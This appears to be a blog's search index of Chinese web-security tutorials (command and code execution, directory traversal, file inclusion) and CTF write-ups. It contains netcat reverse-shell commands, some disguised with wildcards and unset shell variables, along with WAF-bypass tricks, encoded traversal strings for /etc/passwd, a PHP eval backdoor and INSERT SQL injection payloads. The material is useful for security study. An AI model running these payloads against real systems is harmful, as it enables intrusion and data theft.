<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web:命令执行漏洞</title>
      <link href="2021/05/26/web-ming-ling-zhi-xing-lou-dong/"/>
      <url>2021/05/26/web-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="命令执行漏洞原理"><a href="#命令执行漏洞原理" class="headerlink" title="命令执行漏洞原理"></a>命令执行漏洞原理</h3><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>脚本语言优点是简洁，方便，但也伴随着一些问题，如速度慢，无法解除系统底层，如果我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。</p><p>PHP可调用外部程序的常见函数：system,exec,shell_exec,passthru,popen,proc_popen</p><h3 id="命令执行漏洞利用条件"><a href="#命令执行漏洞利用条件" class="headerlink" title="命令执行漏洞利用条件"></a>命令执行漏洞利用条件</h3><ol><li>应用调用执行系统命令的函数</li><li>将用户输入作为系统命令的参数拼接到了命令行中</li><li>没有对用户输入进行过滤或过滤不严</li></ol><h3 id="成因分类"><a href="#成因分类" class="headerlink" title="成因分类"></a>成因分类</h3><p>1.代码层过滤不严格：</p><p>商业应用需要执行命令，商业应用的一些核心代码可能封住在二进制文件当中，在web应用中通过system函数调用。</p><p>system(“/bin/program –arg $arg”)</p><p>2.调用第三方组件存在的代码执行漏洞：</p><p>如wordpress，可以选择imagemagick这个常用的图片处理组件，处理用户上传图片时造成命令执行</p><p>JAVA中 struts2/elasticsearch groovy等</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站甚至服务器</li><li>进一步内网渗透</li><li>等等</li></ol><p><img src="https://img-blog.csdn.net/20161022154115710?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p><img src="https://img-blog.csdn.net/20161022154121113?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p><img src="https://img-blog.csdn.net/20161022154126460?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p><img src="https://img-blog.csdn.net/20161022154130613?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p>漏洞的渗透方法：</p><p>最可靠的方法使用时间延迟推断，类似与盲注的方法。</p><p>1.在URL上cmd=xxxxxx后拼接||ping -i 30 127.0.0.1   (&amp;)应用程序I ping -i 30 127.0.0.1 I</p><p>可能过滤掉某些命令分隔符 可以换做下面的命令：</p><p>I ping -n 30 127.0.0.1 I<br>&amp; ping -i 30 127.0.0.1 &amp;<br>&amp; ping -n 30 127.0.0.1 &amp;<br>;ping 127.0.0.1 ;<br>%0a ping -i 30 127.0.0.1 %0a ‘ ping 127.0.0.1 ‘</p><p>注意windows和linux的语法不同：</p><p>windows支持：&amp;&amp;,&amp;,||（哪条名令为真执行那条）</p><p>linux支持：&amp;&amp;,&amp;,||（执行为真） | （执行后面的语句）</p><p>2.发生延迟，说明程序可能易于受到命令注入的攻击，对尝试几次，确定不是因为网络延迟造成的，更改-i -n 数值，确定时间延迟是否随着提交的值发生变化。</p><p>3.使用发现的所有可成功实施注入的字符串，尝试注入dir、ls</p><p>4不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果给自己的计算机。</p><p>5.查看自己的权限，可以提升自己权限，访问敏感数据或控制服务器。</p><h5 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h5><p>|、||、&amp;、&amp;&amp;的区别：<br>&amp;：无论左边是false还是true，右边都执行<br>&amp;&amp;：具有短路效果，左边是false，右边不执行。<br>|:无论左边是false还是true，右边都会执行<br>||：具有短路效果，左边是true，右边不执行。</p><h5 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h5><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：<br>eval（）、assert（）、preg_replace（）、call_user_func（）<br>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</p><h5 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h5><p>ob_start（）、unserialize（）、creat_function（）<br>、usort（）、uasort（）、uksort（）、<br>array_filter（）、<br>array_reduce（）、<br>array_map（）……</p><p><strong>系统命令执行漏洞</strong><br>system（）<br>exec（）<br>shell_exec（）<br>passthru（）<br>pcntl_exec（）<br>popen（）<br>proc_open（）<br>反引号<br>……</p><p><strong>命令执行WAF绕过技巧</strong><br><strong>技巧一：通配符</strong><br>ls-l<br>使用通配符<br>/?in/?s-l</p><p>/???/??t /??c/p???w?<br>有时候WAF不允许使用太多的？号<br>/?in/cat/?tc/p?sswd</p><p>NC反弹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>为了避免符号，可以将IP地址转换成整型。<br>127.0.0.1-&gt;2130706433</p><p>使用通配符<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p><p><strong>技巧二：连接符</strong></p><p><img src="https://img2018.cnblogs.com/blog/1646039/201909/1646039-20190904124248741-71863935.png" alt="img"></p><p><strong>技巧三：未初始化的bash变量</strong><br>在bash环境中允许我们使用未初始化的bash变量，如何<br>$a ,$b,$c<br>我们事先并没有定义它们，输出看看:<br>root@kali:<del># echo $a<br>root@kali:</del># echo $b<br>root@kali:<del># echo $c<br>root@kali:</del>#<br>未初始化的变量值都是null</p><p>读取/etc/passwd:<br>cat$a /etc$a/passwd$a</p><p>测试WAF<br>测试代码：<br><!--?phpecho "OK";system('dig'.$_GET['host']);?--></p><p><a href="http://www.baidu.com;$s/bin$s/which$s">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>反弹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p><p><strong>漏洞修复：</strong></p><ol><li>尽量少用执行命令的函数或者直接禁用</li><li>参数值尽量使用引号包括</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li><li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web:代码执行漏洞</title>
      <link href="2021/05/26/web-dai-ma-zhi-xing-lou-dong/"/>
      <url>2021/05/26/web-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="简述代码执行漏洞："><a href="#简述代码执行漏洞：" class="headerlink" title="简述代码执行漏洞："></a>简述代码执行漏洞：</h2><p>PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去执行。该漏洞主要存在于eval()、assert()、preg_replace()、call_user_func()、array_map()以及动态函数中。</p><h4 id="1-eval和assert函数"><a href="#1-eval和assert函数" class="headerlink" title="1.eval和assert函数"></a>1.eval和assert函数</h4><p> eval()函数是将输入的字符串当做PHP代码执行，assert()会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</p><h5 id="示例代码1："><a href="#示例代码1：" class="headerlink" title="示例代码1："></a>示例代码1：</h5><pre><code>&lt;?php$a='wjw';$b='xy';eval('$a=$b;');/assert('$a=$b;');var_dump($a);?&gt;</code></pre><p><strong>示例代码2：</strong></p><pre><code>&lt;?phpeval('phpinfo();');/assert('phpinfo();');?&gt;</code></pre><h4 id="2-preg-replace函数"><a href="#2-preg-replace函数" class="headerlink" title="2.preg_replace函数"></a>2.preg_replace函数</h4><p>此函数的作用是对一个字符串进行正则处理（具体函数功能自行搜索）</p><pre><code>mixed preg_replace ( mixed $ pattern , mixed $ replacement , mixed $ subject [, int $ limit = -1 [, int &amp;$ count ]] )</code></pre><p>preg_replace函数的代码执行需要存在/e参数</p><h5 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h5><pre><code>&lt;?phppreg_replace("/ \[(.*)\]/e",'\\1',$_GET['str']);?&gt;</code></pre><p>将显示PHP版本信息</p><h3 id="3-调用函数过滤不严"><a href="#3-调用函数过滤不严" class="headerlink" title="3.调用函数过滤不严"></a>3.调用函数过滤不严</h3><p>call_user_func()和array_map()等函数具有调用其他函数的功能，用call_user_func()函数来举例，函数的作用是调用第一个参数(函数)，将第二个参数作为要调用的函数的参数</p><pre><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )</code></pre><p> <strong>测试代码</strong></p><pre><code>&lt;?php$b="phpinfo()";call_user_func($_GET['a'],$b);?&gt;</code></pre><h2 id="4-动态函数执行"><a href="#4-动态函数执行" class="headerlink" title="4.动态函数执行"></a>4.动态函数执行</h2><p>动态函数的写法为”变量(参数)”</p><h5 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码:"></a>示例代码:</h5><pre><code>&lt;?php$_GET['a']($_GET['b']);?&gt;123</code></pre><p>GET请求参数a，作为函数，而b作为函数的参数，执行结果也是php的版本信息</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web:目录遍历漏洞</title>
      <link href="2021/05/25/web-mu-lu-bian-li-lou-dong/"/>
      <url>2021/05/25/web-mu-lu-bian-li-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是目录遍历？"><a href="#什么是目录遍历？" class="headerlink" title="什么是目录遍历？"></a>什么是目录遍历？</h3><p>目录遍历（目录穿越）是一个Web安全漏洞，攻击者可以利用该漏洞读取运行应用程序的服务器上的任意文件。 这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件。</p><p>在某些情况下，攻击者可能能够在服务器上写入任意文件，（如，FFFTP是一款小型的FTP客户端软件。FFFTP客户端没有正确地验证FTP服务器所返回的LIST命令响应中包含有目录遍历序列（斜线）的文件名，如果用户受骗从恶意的FTP服务器下载的目录包含有带有恶意文件名的文件的话，就可能导致向用户系统的任意位置写入文件）从而允许他们修改应用程序数据或行为，并最终完全控制服务器。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>若web要显示一个商品的图像，有时候开发者会用通过HTML加载，如：</p><pre><code>&lt;img src="/loadImage?filename=214.png"&gt;</code></pre><p>使用filename参数加载图像文件，图片文件位置可能映射在 /var/www/images/ 上，所以真实的路径是 /var/www/images/214.png </p><p>这就导致了攻击者可以读取服务器上的任意文件：</p><pre><code>https://www.*****.com/loadImage?filename=../../../etc/passwd</code></pre><p>filename的参数值与真实路径组合起来就是：</p><pre><code>/var/www/images/../../../etc/passwd</code></pre><p>其等价于：</p><pre><code>/etc/passwd</code></pre><pre><code>在Unix操作系统上，../ 是一个标准的返回上一级路径的语法；在Windows操作系统上， ../ 和 ..\ 都是返回上一级的语句。</code></pre><p>(1) 加密参数传递的数据；</p><p>在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg-  “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。</p><p>(2) 编码绕过，</p><p>尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。</p><p>避开过滤</p><p>第一种是过滤文件名参数中是否存在任何路径遍历序列(..)<br>如果程序尝试删除(..)来净化用户输入，可以用<br>….// …./ …./\ ….\<br>进行URL编码<br>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c<br>进行16为Unicode编码<br>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216<br>进行双倍URL编码<br>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c<br>进行超长UTF-8 Unicode编码<br>点–&gt;%c0%2e %e0$40%ae %c0ae<br>反斜杠–&gt;%c0af %e0%80af %c0%af<br>正斜杠–&gt;%c0%5c %c0%80%5c</p><p>(3) 目录限定绕过；</p><p>在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号“<del>“来绕过。形如这样的提交“downfile.jsp?filename=</del>/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。</p><p>(4) 绕过文件后缀过滤；</p><p>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20</p><p>(5) 绕过来路验证。<br>Http Referer :    HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p><p>在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。</p><p>防范遍历路径漏洞<br>在防范遍历路径漏洞的方法中，最有效的是权限的控制，谨慎的处理向文件系统API传递过来的参数路径。主要是因为大多数的目录或者文件权限均没有得到合理的配置，而Web应用程序对文件的读取大多依赖于系统本身的API，在参数传递的过程，如果没有得严谨的控制，则会出现越权现象的出现。在这种情况下，Web应用程序可以采取以下防御方法，最好是组合使用。<br>(1) 数据净化，对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。<br>(2) Web应用程序可以使用chrooted环境访问包含被访问文件的目录，或者使用绝对路径+参数来控制访问目录，使其即使是越权或者跨越目录也是在指定的目录下。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web:文件包含漏洞</title>
      <link href="2021/05/24/web-wen-jian-bao-han-lou-dong/"/>
      <url>2021/05/24/web-wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h3><h4 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h4><p>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p><h4 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2.文件包含漏洞"></a>2.文件包含漏洞</h4><p>开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p><h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h4><p>包含服务器本身存在的恶意文件<br>a.txt</p><pre><code>&lt;?php phpinfo();?&gt;</code></pre><p>b.php</p><pre><code>&lt;?php$b=$_GET['id'];include($b);?&gt;</code></pre><p>payload:</p><pre><code>localhost/b.php?id=a.txt //返回phpinfo页面</code></pre><p>注：<br>    1.两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）<br>    2.被包含的页面的后缀无论是什么都会当做PHP解析</p><h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h4><p>包含其他网站上的恶意文件<br>远程文件包含利用条件：在php.ini中allow_url_fopen=on、allow_url_include=on</p><p>payload：</p><pre><code>localhost/b.php?id=http://ip/文件路径</code></pre><p>​    1</p><p>注：<br>    远程包含的文件路径必须是绝对路径</p><h3 id="存在文件包含的脚本语言及应用函数"><a href="#存在文件包含的脚本语言及应用函数" class="headerlink" title="存在文件包含的脚本语言及应用函数"></a>存在文件包含的脚本语言及应用函数</h3><p>php</p><pre><code>1.include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行2.require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行3.include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含</code></pre><p>jsp/servlet</p><pre><code>1.ava.io.file()2.java.io.filereader()</code></pre><p>asp</p><pre><code>1.include file2.include virtual</code></pre><h3 id="各个协议实现命令执行"><a href="#各个协议实现命令执行" class="headerlink" title="各个协议实现命令执行"></a>各个协议实现命令执行</h3><p>%00截断</p><pre><code>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，如果有就需要使用%00进行截断当php版本&lt;=5.2使用%00截断</code></pre><p>file：//:用于访问本地文件系统</p><pre><code>条件(php.ini)：    allow_url_fopen   off/on    allow_url_include off/on使用方法：file：//[文件的绝对路径和文件名]</code></pre><p>php://:访问各个输入输出流</p><pre><code> php：//filter：用于读取源码并进行bash64编码输出；    条件（php.ini）：        allow_url_fope   off/on        allow_url_include off/on    php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；    条件(php.ini)：        allow_url_fope   off/on        allow_url_include on    php://stdin是只读的，php://stdout 和 php://stderr 是只写的。    php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。    php://fd 允许直接访问指定的文件描述符。</code></pre><p>zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p><pre><code>条件：    allow_url_fope   off/on    allow_url_include off/onzip://使用方法：    zip://[压缩文件绝对路径]#[压缩文件内的子文件名]bzip2://使用方法：    bzip2://file.bz2zlib://使用方法：    zlib://file.gz</code></pre><p>data://</p><pre><code>条件：    allow_url_fope   on    allow_url_include on</code></pre><h3 id="直接执行代码的函数："><a href="#直接执行代码的函数：" class="headerlink" title="直接执行代码的函数："></a>直接执行代码的函数：</h3><p>Eval()、assert()、system()、exec()、shell_exec()、passthru()、</p><p>Escapeshellcmd()、pcntl_exec()等就不一一举例了。</p><p>1、eval()</p><p>eval() 函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序：<!--?phpeval($_POST[cmd])?--></p><p>2、assert() 与eval类似，字符串被 assert() 当做 PHP 代码来执行；</p><p>PHP文件包含漏洞<br>开发人员都希望代码更加灵活，所以通常会将被包含的文件设置为变量，用来进行动态调用。正是这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><h3 id="常见的导致文件包含的函数："><a href="#常见的导致文件包含的函数：" class="headerlink" title="常见的导致文件包含的函数："></a>常见的导致文件包含的函数：</h3><p>PHP:include()、include_once()、require()、require_once()等；<br>1.php文件包含可以直接执行包含文件的代码，包含的文件格式不受任何限制<br>在 php 中提供了四个文件包含函数：<br>(1) Require: 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本；<br>(2) Include：找不到被包含的文件时只会产生一个(E_warinng)，脚本将继续执行；<br>(3) Require_once：与 include 类似会产生警告，区别是如果文件代码已经被包含，则不会再<br>次被包含；</p><p>2、文件包含漏洞利用的前提条件：<br>（1）web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参<br>数的方式引入；<br>（2）用户能够控制包含文件的参数，被包含的文件可被当前页面访问；</p><p>3、文件包含获取 webshell 的条件：<br>（1）攻击者需要知道文件存放的物理路径；<br>（2）对上传文件所在目录拥有可执行权限；<br>（3）存在文件包含漏洞；</p><p>4、典型特征<br>变量的值为一个页面：<br>?page=a.php<br>?home=b.html<br>?file=content…</p><p>5、常见的敏感路径：<br>1 Windows<br>C:\boot.ini //查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件<br>C:\windows\repair\sam //存储 windows 系统初次安装的密码<br>C:\Program Files\mysql\my.ini //mysql 配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\windows\php.ini //php 配置信息<br>C:\windows\my.ini //mysql 配置文件</p><p>2 UNIX/Linux<br>/etc/passwd<br>/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置<br>/usr/local/app/php5/lib/php.ini //PHP 相关配置<br>/etc/httpd/conf/httpd.conf //apache<br>/etc/php5/apache2/php.ini //ubuntu 系统的默认路径</p><p>日志默认路径<br>(1) apache+Linux 日志默认路径<br>/etc/httpd/logs/access_log<br>或者<br>/var/log/httpd/access_log</p><p>(2) apache+win2003 日志默认路径<br>D:\xampp\apache\logs\access.log<br>D:\xampp\apache\logs\error.log</p><p>(3) IIS6.0+win2003 默认日志文件<br>C:\WINDOWS\system32\Logfiles</p><p>(4) IIS7.0+win2003 默认日志文件<br>%SystemDrive%\inetpub\logs\LogFiles</p><p>(5) nginx 日志文件<br>日志文件在用户安装目录 logs 目录下<br>以我的安装路径为例/usr/local/nginx,<br>那我的日志目录就是在/usr/local/nginx/logs里<br>web 中间件默认配置<br>(1) apache+linux 默认配置文件<br>/etc/httpd/conf/httpd.conf<br>或者<br>index.php?page=/etc/init.d/httpd<br>(2) IIS6.0+win2003 配置文件<br>C:/Windows/system32/inetsrv/metabase.xml<br>(3) IIS7.0+WIN 配置文件<br>C:\Windows\System32\inetsrv\config\applicationHost.config</p><h3 id="常见的绕过与防御"><a href="#常见的绕过与防御" class="headerlink" title="常见的绕过与防御"></a>常见的绕过与防御</h3><h4 id="1-00截断（php-lt-5-3-4）"><a href="#1-00截断（php-lt-5-3-4）" class="headerlink" title="1.%00截断（php<5.3.4）"></a>1.%00截断（php&lt;5.3.4）</h4><pre><code>说明：    PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断  file变量之后的字符串。防御：    禁用0字节</code></pre><h4 id="2-超长字符截断"><a href="#2-超长字符截断" class="headerlink" title="2.超长字符截断"></a>2.超长字符截断</h4><pre><code>利用：    利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。    我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。    而利用"./"的方式即可构造出超长目录字符串防御：    限制用户输入字符长度</code></pre><h4 id="3-任意目录遍历"><a href="#3-任意目录遍历" class="headerlink" title="3.任意目录遍历"></a>3.任意目录遍历</h4><pre><code>利用：    使用"../../../"这样的方式来返回到上层目录中，这种方式又被称为"目录遍历(Path Traversal)"。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)防御：    目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。    open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)</code></pre><h4 id="4-问号截断"><a href="#4-问号截断" class="headerlink" title="4.问号截断"></a>4.问号截断</h4><pre><code>利用：    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?防御：    关闭远程文件包含的配置选项allow_url_include = Off</code></pre><h3 id="防御总结"><a href="#防御总结" class="headerlink" title="防御总结"></a>防御总结</h3><pre><code>1.无需情况下设置allow_url_include和allow_url_fopen为关闭2.对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir3.尽量不使用动态包含4.严格检查变量是否已经初始化。5.建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。6.严格检查include类的文件包含函数中的参数是否外界可控。7.不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。8.在发布应用程序之前测试所有已知的威胁。</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-HelloWorld</title>
      <link href="2021/05/20/i-chun-qiu-web-helloworld/"/>
      <url>2021/05/20/i-chun-qiu-web-helloworld/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.freesion.com/images/522/35569c24a4261ead1f06bac02613ff22.png" alt="1"></p><p>存在.git源码泄露漏洞</p><p>git_extract扫描</p><p><img src="/2021/05/20/i-chun-qiu-web-helloworld/0dfe8fd56e7c7c21ac020942f1a6b7d.png" alt="0dfe8fd56e7c7c21ac020942f1a6b7d"></p><p><img src="/2021/05/20/i-chun-qiu-web-helloworld/9b14c5baec6fc17c25a290ec8e23502.png" alt="9b14c5baec6fc17c25a290ec8e23502"></p><p>把这两拉到beyond compare比较：</p><p><img src="/2021/05/20/i-chun-qiu-web-helloworld/444ef4ba783346a7c53ea45f728c4f5.png" alt="444ef4ba783346a7c53ea45f728c4f5"></p><p>不一样的地方为flag：</p><pre><code>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋:Web-Blog</title>
      <link href="2021/05/18/i-chun-qiu-web-blog/"/>
      <url>2021/05/18/i-chun-qiu-web-blog/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/18/i-chun-qiu-web-blog/af732d2efa39b352f28282731713236.png" alt="af732d2efa39b352f28282731713236"></p><p><img src="/2021/05/18/i-chun-qiu-web-blog/2f76efeb2524974afe648a1e5273c0c.png" alt="2f76efeb2524974afe648a1e5273c0c"></p><p>得到路径：  /kindeditor/php/upload_json.php</p><p> 知道编辑版为 kindeditor，搜索相关漏洞，得到利用</p><pre><code> /kindeditor/php/file_manager_json.php?path=/</code></pre><p>访问：</p><pre><code>/kindeditor/php/file_manager_json.php?path=../../ </code></pre><p><img src="/2021/05/18/i-chun-qiu-web-blog/d879bbe9821057bd315346509fae17e.png" alt="d879bbe9821057bd315346509fae17e"></p><p>尝试注入：</p><pre><code>title=1' and '1'='1  返回1 </code></pre><pre><code>title=1' and '1'='2  返回0 </code></pre><p> 了解到这是一个insert注入</p><p> insert into table(columns) values(A1,B1,C1)</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/05e4af14c2cb7fff3f502993faf7a5a.png" alt="05e4af14c2cb7fff3f502993faf7a5a"></p><pre><code>title=p1&amp;content=1','1'),('aaa',(database()),'1</code></pre><pre><code>title=p2&amp;content=1','1'),('aaa',(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()),'2</code></pre><pre><code>title=p3&amp;content=1','1'),('aaa',(SELECT group_concat(column_name) from information_schema.columns where table_name='users'),'3</code></pre><pre><code>title=p4&amp;content=1','1'),('aaa',(SELECT group_concat(password) from users),'4</code></pre><p>依次尝试结果如下：</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/bdb25940d7171a3b6273fc98dc56960.png" alt="bdb25940d7171a3b6273fc98dc56960"></p><ul><li>dbb616c5d935d8f34c12c291066d6fb7</li><li>202cb962ac59075b964b07152d234b70</li><li>250cf8b51c773f3f8dc8b4be867a9a02</li><li>68053af2923e00204c3ca7c6a3150cf7</li></ul><p>解密为： melody123 123 456 789</p><p>访问admin melody123</p><pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=article_manage&amp;name=php</code></pre><p>可能存在文件包含</p><pre><code>http://0ecb2feb6f4c483b8ac915b0e3a6c841369800c33d7945ee.changame.ichunqiu.com/blog_manage/manager.php?module=php://filter/read=convert.base64-encode/resource=../flag&amp;name=php</code></pre><p><img src="/2021/05/18/i-chun-qiu-web-blog/f7ec6bb8b94fba17307d1752a124d19.png" alt="f7ec6bb8b94fba17307d1752a124d19"></p><p>base64解码得到flag</p><p><img src="/2021/05/18/i-chun-qiu-web-blog/2325cb6cebbefed58516c4d5d1b3e80.png" alt="2325cb6cebbefed58516c4d5d1b3e80"></p>]]></content>
      
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《从0到1：CTFer成长之路》：Web-Upload</title>
      <link href="2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/"/>
      <url>2021/05/17/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-upload/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《从0到1：CTFer成长之路》:Web-XSS闯关</title>
      <link href="2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/"/>
      <url>2021/05/16/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-xss-chuang-guan/</url>
      
